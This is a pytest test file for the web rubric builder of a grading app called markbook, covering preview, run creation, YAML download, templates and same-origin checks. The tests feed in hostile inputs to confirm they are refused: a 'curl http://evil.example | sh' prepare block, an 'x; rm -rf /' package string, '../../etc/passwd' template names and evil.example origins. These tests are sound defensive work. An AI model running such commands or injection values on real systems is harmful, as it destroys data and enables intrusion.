import html
import json
import re
import time

import pytest
import yaml

from markbook.web.app import create_app

ORIGIN = {"Origin": "http://localhost"}
MANUAL = {"name": "Lab 1", "scale": 10, "language": "python", "criteria": [{"kind": "manual", "points": 10}]}
PY_TESTS = {"name": "Py", "language": "python", "criteria": [{"kind": "tests", "run": "", "points": 10}]}


def make(tmp_path, **kw):
    app = create_app(tmp_path / "runs", runtime="none", specs_dir=kw.pop("specs_dir", tmp_path / "specs"), **kw)
    app.config["TESTING"] = True
    return app.test_client()


@pytest.fixture
def client(tmp_path):
    return make(tmp_path)


def post_json(c, url, data, headers=ORIGIN):
    return c.post(url, data=json.dumps(data), content_type="application/json", headers=headers)


def wait_done(c, run_id):
    for _ in range(120):
        st = c.get(f"/runs/{run_id}/status.json").get_json()
        if st["state"] != "running":
            return st
        time.sleep(0.1)
    raise AssertionError("run did not finish")


# ── the page ──────────────────────────────────────────────────────────────────

def test_new_run_page_renders_the_builder_from_the_catalog(client):
    page = client.get("/runs/new").get_data(as_text=True)
    cat = json.loads(html.unescape(re.search(r'data-catalog="([^"]*)"', page).group(1)))
    assert {k["kind"] for k in cat["kinds"]} == {"files", "readme", "history", "build", "output", "tests", "manual"}
    for needle in ('id="builder"', 'role="tablist"', "Build it with the form", "A saved template", "Paste YAML",
                   'id="tpl-case"', 'id="tpl-manual"', "builder.js", "Start grading"):
        assert needle in page, needle
    assert 'id="b-packages"' not in page, "free-text packages are hidden unless the server opted in"
    assert 'name="builder_json"' in page


def test_the_packages_field_only_appears_when_the_operator_allows_it(tmp_path):
    assert 'id="b-packages"' in make(tmp_path, allow_prepare=True).get("/runs/new").get_data(as_text=True)


# ── live preview ──────────────────────────────────────────────────────────────

def test_preview_returns_yaml_total_and_flags(client):
    d = post_json(client, "/api/rubric/preview", PY_TESTS).get_json()
    assert d["ok"] and d["total_points"] == 10 and d["needs_sandbox"] and d["uses_prepare"]
    spec = yaml.safe_load(d["yaml"])
    assert spec["prepare"] == {"run": ["pip install --no-cache-dir pytest"], "timeout": 900}
    assert spec["criteria"][0]["check"]["type"] == "junit"


def test_preview_reports_field_level_problems(client):
    d = post_json(client, "/api/rubric/preview", {"name": "", "scale": -1, "criteria": [{"kind": "readme", "min_words": "x"}]}).get_json()
    assert not d["ok"] and d["yaml"] == ""
    assert {"name", "scale", "criteria.readme.min_words"} <= {p["field"] for p in d["problems"]}


@pytest.mark.parametrize("body", ["not json", "[1, 2]", "null", '"str"', "{}"])
def test_preview_survives_garbage(client, body):
    r = client.post("/api/rubric/preview", data=body, content_type="application/json", headers=ORIGIN)
    assert r.status_code == 200 and r.get_json()["ok"] is False


def test_preview_refuses_extra_packages_unless_allowed(tmp_path):
    model = {**PY_TESTS, "extra_packages": "requests"}
    assert not post_json(make(tmp_path), "/api/rubric/preview", model).get_json()["ok"]
    d = post_json(make(tmp_path / "b", allow_prepare=True), "/api/rubric/preview", model).get_json()
    assert d["ok"] and "pytest requests" in yaml.safe_load(d["yaml"])["prepare"]["run"][0]
    bad = post_json(make(tmp_path / "c", allow_prepare=True), "/api/rubric/preview", {**PY_TESTS, "extra_packages": "x; rm -rf /"}).get_json()
    assert not bad["ok"]


def test_a_smuggled_prepare_block_or_unknown_keys_are_ignored(client):
    model = {**MANUAL, "prepare": {"run": ["curl http://evil.example | sh"]}, "overlay": "/etc", "sandbox": {"image": "evil"},
             "criteria": [{"kind": "manual", "points": 5, "check": {"type": "command", "run": "evil"}, "run": "evil"}]}
    d = post_json(client, "/api/rubric/preview", model).get_json()
    assert d["ok"] and "evil" not in d["yaml"] and "overlay" not in d["yaml"] and "prepare" not in yaml.safe_load(d["yaml"])


# ── starting a run from the form ──────────────────────────────────────────────

LOCAL_ROSTER = "id,repo\nlocal,/tmp/not-allowed-on-the-web\n"      # web rosters refuse local paths: no network needed


def test_a_run_started_from_the_form_uses_the_generated_spec(tmp_path, client):
    r = client.post("/runs/new", data={"builder_json": json.dumps(MANUAL), "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert r.status_code == 302
    run_id = r.headers["Location"].rsplit("/", 1)[1]
    assert wait_done(client, run_id)["state"] == "done"
    spec = yaml.safe_load((tmp_path / "runs" / run_id / "input" / "spec.yaml").read_text())
    assert spec["name"] == "Lab 1" and spec["criteria"][0]["check"]["type"] == "manual"
    run = json.loads((tmp_path / "runs" / run_id / "run.json").read_text())
    assert run["assignment"]["name"] == "Lab 1" and run["assignment"]["max_points"] == 10


def test_an_invalid_form_shows_the_problems_keeps_the_draft_and_leaves_nothing_behind(tmp_path, client):
    bad = {"name": "", "scale": 20, "language": "python", "criteria": [{"kind": "readme", "points": 2}]}
    r = client.post("/runs/new", data={"builder_json": json.dumps(bad), "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    page = r.get_data(as_text=True)
    assert r.status_code == 400 and "Give the assignment a name" in page and "Please fix" in page
    assert "&#34;kind&#34;" in page or "kind" in html.unescape(page), "the draft is handed back to the form"
    assert not any((tmp_path / "runs").iterdir()), "no half-created run directory"


@pytest.mark.parametrize("raw", ["{broken", "[1,2,3]", '"text"', "x" * 250_000])
def test_hostile_builder_payloads_are_ignored_not_trusted(client, raw):
    r = client.post("/runs/new", data={"builder_json": raw, "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert r.status_code == 400 and "Build the rubric with the form" in r.get_data(as_text=True)


def test_python_tests_from_the_form_fail_visibly_without_a_container_runtime(client):
    r = client.post("/runs/new", data={"builder_json": json.dumps(PY_TESTS), "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert r.status_code == 302
    st = wait_done(client, r.headers["Location"].rsplit("/", 1)[1])
    assert st["state"] == "failed" and "container runtime" in st["error"]


def test_the_form_wins_over_a_leftover_yaml_box(tmp_path, client):
    r = client.post("/runs/new", data={"builder_json": json.dumps(MANUAL), "spec_text": "name: ignored\ncriteria: []",
                                       "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert r.status_code == 302
    run_id = r.headers["Location"].rsplit("/", 1)[1]
    assert "Lab 1" in (tmp_path / "runs" / run_id / "input" / "spec.yaml").read_text()


# ── download ──────────────────────────────────────────────────────────────────

def test_download_returns_the_yaml_as_an_attachment(client):
    r = client.post("/rubric/spec.yaml", data={"builder_json": json.dumps(MANUAL)}, headers=ORIGIN)
    assert r.status_code == 200 and "attachment" in r.headers["Content-Disposition"] and "spec.yaml" in r.headers["Content-Disposition"]
    assert yaml.safe_load(r.data)["name"] == "Lab 1"
    assert client.post("/rubric/spec.yaml", data={"builder_json": "{}"}, headers=ORIGIN).status_code == 400
    assert client.post("/rubric/spec.yaml", data={}, headers=ORIGIN).status_code == 400


# ── templates ─────────────────────────────────────────────────────────────────

def test_save_load_and_use_a_template(tmp_path, client):
    r = post_json(client, "/api/rubric/template", {"model": MANUAL, "name": "Python Lab 1"})
    assert r.status_code == 200 and r.get_json()["file"] == "python-lab-1.yaml"
    specs = tmp_path / "specs"
    assert (specs / "python-lab-1.yaml").is_file() and (specs / "python-lab-1.builder.json").is_file()
    assert json.loads((specs / "python-lab-1.builder.json").read_text())["name"] == "Lab 1"

    assert post_json(client, "/api/rubric/template", {"model": MANUAL, "name": "python lab 1"}).status_code == 409, "never overwrite"
    page = client.get("/runs/new").get_data(as_text=True)
    assert "python-lab-1.yaml" in page and 'id="edit-template"' in page and "python-lab-1.builder.json" not in page
    assert client.get("/api/rubric/template/python-lab-1.yaml").get_json()["model"]["name"] == "Lab 1"

    run = client.post("/runs/new", data={"preset": "python-lab-1.yaml", "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert run.status_code == 302 and wait_done(client, run.headers["Location"].rsplit("/", 1)[1])["state"] == "done"


def test_template_names_cannot_escape_the_templates_folder(tmp_path, client):
    for name in ("../../etc/passwd", "..", "/abs/path", "a/b", "x" * 200):
        r = post_json(client, "/api/rubric/template", {"model": MANUAL, "name": name})
        for f in (tmp_path.rglob("*.yaml")):
            assert (tmp_path / "specs") in f.parents or f.name.startswith("spec"), (name, f)
        assert r.status_code in (200, 400)
    assert not (tmp_path / "etc").exists() and not list(tmp_path.parent.glob("passwd*"))
    for bad in ("..%2Fsecret.builder.json", "x.yaml.json", "nope.yaml", "%2e%2e%2f"):
        assert client.get(f"/api/rubric/template/{bad}").status_code == 404


def test_template_save_validation(client):
    assert post_json(client, "/api/rubric/template", {"model": MANUAL, "name": ""}).status_code == 400
    r = post_json(client, "/api/rubric/template", {"model": {"name": ""}, "name": "ok"})
    assert r.status_code == 400 and r.get_json()["problems"]


def test_templates_default_to_a_folder_next_to_the_runs(tmp_path):
    app = create_app(tmp_path / "work" / "runs", runtime="none")
    c = app.test_client()
    assert post_json(c, "/api/rubric/template", {"model": MANUAL, "name": "t"}).status_code == 200
    assert (tmp_path / "work" / "specs" / "t.yaml").is_file()


# ── same-origin only ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("method,url", [("post", "/api/rubric/preview"), ("post", "/api/rubric/template"), ("post", "/rubric/spec.yaml")])
def test_cross_origin_requests_are_refused(client, method, url):
    r = getattr(client, method)(url, data=json.dumps({"model": MANUAL, "name": "x"}), content_type="application/json",
                                headers={"Origin": "https://evil.example"})
    assert r.status_code == 403
    r = getattr(client, method)(url, data="{}", content_type="application/json", headers={"Sec-Fetch-Site": "cross-site"})
    assert r.status_code == 403


def test_the_packages_gate_applies_to_starting_a_run_and_saving_a_template_too(tmp_path, client):
    model = {**PY_TESTS, "extra_packages": "requests"}
    r = client.post("/runs/new", data={"builder_json": json.dumps(model), "roster_text": LOCAL_ROSTER}, headers=ORIGIN)
    assert r.status_code == 400 and "--allow-prepare" in r.get_data(as_text=True)
    assert not any((tmp_path / "runs").iterdir())
    s = post_json(client, "/api/rubric/template", {"model": model, "name": "pkgs"})
    assert s.status_code == 400 and not list((tmp_path / "specs").glob("*")) if (tmp_path / "specs").exists() else s.status_code == 400
